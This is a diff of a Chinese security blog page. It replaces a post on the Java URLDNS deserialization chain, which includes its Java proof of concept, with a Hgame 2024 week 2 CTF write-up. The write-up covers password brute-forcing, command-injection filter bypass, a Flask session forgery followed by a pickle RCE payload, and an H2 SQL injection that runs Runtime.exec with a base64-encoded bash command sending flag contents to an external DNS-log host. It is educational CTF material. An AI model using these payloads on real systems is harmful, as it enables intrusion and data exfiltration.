@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      java反序列化——URLDNS链 | Infernity&#39;s Blog
+      Hgame 2024 week 2 | Infernity&#39;s Blog
     
   </title>
   <meta name="author" content="Infernity">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「java反序列化——URLDNS链」
+			「Hgame 2024 week 2」
 		
 	</p>
 
@@ -246,8 +246,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" itemprop="url">
-		java反序列化——URLDNS链
+	<a href="/2024/02/06/Hgame-2024-week-2/" itemprop="url">
+		Hgame 2024 week 2
 	</a>
 
 		</div>
@@ -263,8 +263,8 @@
 
 	更新于
 
-	<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" itemprop="url">
-		<time datetime="2024-03-29T06:01:24.000Z" itemprop="dateUpdated">
+	<a href="/2024/02/06/Hgame-2024-week-2/" itemprop="url">
+		<time datetime="2024-02-06T08:19:35.000Z" itemprop="dateUpdated">
 	  		2024-03-30
 	  </time>
 	</a> 
@@ -276,8 +276,8 @@
 				
 	<i class="icon-price-tags"></i>
 	
-		<a href="/tags/JAVA/" class=" ">
-			JAVA
+		<a href="/tags/WPs/" class=" ">
+			WPs
 		</a>
 	
 		
@@ -286,7 +286,7 @@
 			
 
 	
-    <span class="leancloud_visitors" id="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/_visitors" data-url="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" data-title="java反序列化——URLDNS链">
+    <span class="leancloud_visitors" id="/2024/02/06/Hgame-2024-week-2/_visitors" data-url="/2024/02/06/Hgame-2024-week-2/" data-title="Hgame 2024 week 2">
        	<i class="icon-eye"></i>
        	热度
         
@@ -298,7 +298,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/_likes" data-url="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" data-title="java反序列化——URLDNS链" rel="unlike">
+    <span class="leancloud_likes" id="/2024/02/06/Hgame-2024-week-2/_likes" data-url="/2024/02/06/Hgame-2024-week-2/" data-title="Hgame 2024 week 2" rel="unlike">
         <i class="icon-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -308,37 +308,61 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87.png" alt="图片.png"></p>
-<p>而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(1).png" alt="图片.png"></p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(2).png" alt="图片.png"></p>
-<p>而在这个方法里，会执行getHostAddress方法，这是根据域名解析IP地址的函数。</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(3).png" alt="图片.png"></p>
-<p>结合DNS的相关知识，也就是说只要走到这个函数，就一定会发出DNS请求。</p>
-<p>同样的，hashMap类也实现了序列化接口，<img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(4).png" alt="图片.png"></p>
-<p>在hashMap类也重写了readObject，里面也调用了hashCode方法，也就会发出DNS请求。</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(5).png" alt="图片.png"></p>
-<p>所以链子是这样的：</p>
-<p>new hashMap—&gt;hashmap.put(new URL(“这里放url”),1)—&gt;serialize—&gt;unserialize发出DNS请求</p>
-<h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>但是这样写有个问题，运行代码后发现只有在序列化的时候收到了一次DNS请求，而在反序列化的时候反而收不到DNS请求，这是因为hashMap.put方法里同样也调用了hash方法：</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328111827604.png" alt="image-20240328112125969.png"></p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328112125969.png" alt="image-20240328112136169.png"></p>
-<p>如果不修改hashCode的值，那么我们传入的url就会触发DNS请求，并被hash编码，此后并不能触发反序列化。</p>
-<h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>结合前面hashCode的-1判断，不难想到：如果能修改hashCode的值，那么就可以绕过put时hash的触发，而在put之后再把hashCode改回来，就完成整条链子了。</p>
-<h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><p>我们可以通过反射，修改对象属性的值。</p>
-<p>最后的链子就是：</p>
-<p>new hashMap—&gt;X—&gt;hashmap.put(new URL(“填url”),1)—&gt;Y—&gt;serialize—&gt;unserialize发出DNS请求</p>
-<p>X 为url.getClass()获取url类—&gt;getDeclaredField(“hashCode”)获取属性hashCode—&gt;set(url,1234)修改hashCode的值不为-1</p>
-<p>Y 为set(url,-1)改回hashCode的值</p>
-<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;         <span class="comment">//用writeObject写序列化文件。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();    <span class="comment">//新建hashmap对象</span></span><br><span class="line">        <span class="comment">//这里不要发起请求，把url对象的hashCode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>);   <span class="comment">//新建URL的对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();    <span class="comment">//获取URL对象的类</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);    <span class="comment">//获取URL对象的类中的hashCode属性</span></span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);     <span class="comment">//因为hashCode是private的变量，所以需要设置</span></span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);    <span class="comment">//设置hashCode值1234</span></span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//通过反射 改变已有对象属性</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);  <span class="comment">//这里把hashCode值改回-1</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+			<p>by:Infernity</p>
+<h1 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a><strong>Select More Courses</strong></h1><p>提示已经给的很明显了，弱密码爆破，拿上密码字典去burp里爆破。</p>
+<p><img src="/img/Hgame_2024/13.png" alt="图片.png"></p>
+<p>爆出密码为qwert123</p>
+<p>然后进入选课界面，发现已达到学分上限，没法选课，那就退出来看第一个增加学分的页面，给了提示：</p>
+<p>Race against time!</p>
+<p><img src="/img/Hgame_2024/14.png" alt="图片.png"></p>
+<p>跟上次一样，无限发包，大概发个几百个即可。</p>
+<p>现在退回到选课界面，发现最高学分已经超出很多了。</p>
+<p><img src="/img/Hgame_2024/15.png" alt="图片.png"></p>
+<p>直接选课拿flag</p>
+<p><strong>hgame{5ak_p45sW0rD_&amp;_r4Ce_c0nDiT10n}</strong></p>
+<h1 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a><strong>What the cow say?</strong></h1><p>回显输入的东西，怀疑后台是echo，试试内敛执行。</p>
+<p>`ls`能看到回显，那这道题就是绕过过滤了。直接看看app.py，发现cat被过滤，试试`tac app.py&#96;</p>
+<p><img src="/img/Hgame_2024/16.png" alt="图片.png"></p>
+<p>这是源码，发现过滤了这些。</p>
+<p>根目录有个flag_is_here，那么因为过滤了flag，就用通配符。</p>
+<p>`tac &#x2F;f*&#96;发现打不开，说这个是文件夹，那么进入这个文件夹看看。</p>
+<p>`ls &#x2F;f*&#96;发现还有个flag文件，打开这个，同样用通配符：</p>
+<p>`tac &#x2F;f*&#x2F;f*&#96;</p>
+<p><strong>hgame{C0wsay_be_c4re_aB0ut_ComMand_Injecti0n}</strong></p>
+<h1 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a><strong>myflask</strong></h1><p>给了源码，在&#x2F;flag接口处验证我们的session token 是不是admin，还给了SECRET_KEY</p>
+<p>但是key需要我们先去破译</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">currentDateAndTime = datetime.now(timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">currentTime = currentDateAndTime.strftime(<span class="string">&quot;%H%M%S&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-<h4 id="关于hashcodefield-set-url-1234"><a href="#关于hashcodefield-set-url-1234" class="headerlink" title="关于hashcodefield.set(url,1234);"></a>关于hashcodefield.set(url,1234);</h4><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328112136169.png" alt="image-20240328111827604.png"></p>
-<p>set方法的第一个参数是属性所对应的对象，这里属性是hashcodefield，对象是url，值是1234</p>
+<p>这段代码是获取当前时间。说明密钥是创建这个实例当时的时间，可以在创建实例之前自己在python里运行一下代码，得到当前时间，再把时间往后倒退几位来测试密钥。</p>
+<p>接着就把username改成admin</p>
+<p><img src="/img/Hgame_2024/17.png" alt="图片.png"></p>
+<p>然后打入cookie，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For POST requests from admin</span></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">    pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">    <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br></pre></td></tr></table></figure>
+
+<p>这一段是post传参pickle_data，然后pickle反序列化，别忘了payload还要base64加密一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
+
+<p>运行后打入payload。</p>
+<p><strong>hgame{876a9e31bd250d49befe59230ca95882fd6d2a5d}</strong></p>
+<h1 id="search4member"><a href="#search4member" class="headerlink" title="search4member"></a>search4member</h1><p>这道题给了docker包，里面是java编写的。</p>
+<p>这道题看似是sql注入，其实是sql注入，只不过是java sql注入。</p>
+<p>更近一步说是h2sql注入。</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181032#h2-2">https://www.anquanke.com/post/id/181032#h2-2</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;CREATE ALIAS EXEC AS CONCAT(&#x27;</span><span class="keyword">void</span> <span class="title function_">e</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">HEXTORAW(&#x27;</span>007b<span class="string">&#x27;),&#x27;</span>java.lang.Runtime rt= java.lang.Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);<span class="string">&#x27;,HEXTORAW(&#x27;</span><span class="number">007d</span><span class="string">&#x27;));</span></span><br><span class="line"><span class="string">CALL EXEC(&#x27;</span>whoami<span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这里不能直接执行命令，这里是无回显的。那么可以尝试curl外带文件，但是这道题不出网，那就只能DNS外带文件。</p>
+<p>x&#x3D;base64(curl `cat &#x2F;f*&#96;.你的DNS网址)</p>
+<p>bash -c {echo,这里放x}|{base64,-d}|{bash,-i}</p>
+<p>去在线网站找个DNSlog网址，拿到DNS网址后base64加密嵌入payload当中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;CREATE ALIAS EXEC AS CONCAT(&#x27;</span><span class="keyword">void</span> <span class="title function_">e</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> java.io.IOException<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">HEXTORAW(&#x27;</span>007b<span class="string">&#x27;),&#x27;</span>java.lang.Runtime rt= java.lang.Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);<span class="string">&#x27;,HEXTORAW(&#x27;</span><span class="number">007d</span><span class="string">&#x27;));</span></span><br><span class="line"><span class="string">CALL EXEC(&#x27;</span>bash -c &#123;echo,Y3VybCBgY2F0IC9mKmAuaGNlczZoZmMucmVxdWVzdHJlcG8uY29t&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br><span class="line"><span class="string">&#x27;);--+</span></span><br></pre></td></tr></table></figure>
+
+<p>把这一段payload直接打进去，然后在dnslog查看request。</p>
+<p><img src="/img/Hgame_2024/18.png" alt="图片.png"></p>
+<p><strong>hgame{a124e279c953d7c44d4c839f209b004ff4261084}</strong></p>
 	
 		</div>
 		
-		<div id="current-post-cover" data-scr="/img/computer.jpg"></div>
+		<div id="current-post-cover" data-scr="/img/Hgame_2024/HgameCTF2024.png"></div>
 
 		<!-- relate post, comment...-->
 		<div class="investment-container">
@@ -353,8 +377,12 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
+			<a href="/2024/02/13/Hgame-2024-week-3/" title="Hgame 2024 week 3" rel="prev">
+				&laquo;上一篇
+			</a>
 		
-			<a href="/2024/03/25/NKCTF2024/" title="NKCTF2024" rel="next">
+		
+			<a href="/2024/02/05/Begin-CTF-2024/" title="Begin CTF 2024" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -529,32 +557,6 @@ Zero Link这道题我做了好久，源码一大堆，撇去其他的，主要�
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/02/06/Hgame-2024-week-2/" title="Hgame 2024 week 2">
-								Hgame 2024 week 2			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								二月 6日, 2024				
-							</p>
-							<p class="relate-post-content">
-								by:Infernity
-Select More Courses提示已经给的很明显了，弱密码爆破，拿上密码字典去burp里爆破。
-
-爆出密码为qwert123
-然后进入选课界面，发现已达到学分上限，没法选课，那就退出来看第一个增加学分...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/02/06/Hgame-2024-week-2/" title="Hgame 2024 week 2">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 2"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
 							<a class="relate-post-title" href="/2024/02/05/Begin-CTF-2024/" title="Begin CTF 2024">
 								Begin CTF 2024			
 							</a>
@@ -599,6 +601,33 @@ referer:vidar.club
 							<a href="/2024/01/31/Hgame%202024%20week%201/" title="Hgame 2024 week 1">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 1"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">
+								java反序列化——URLDNS链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 29日, 2024				
+							</p>
+							<p class="relate-post-content">
+								原理：根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。
+
+而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：
+
+
+而在这...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="java反序列化——URLDNS链"/>
 							</a>
 						</div>
 					</li>												
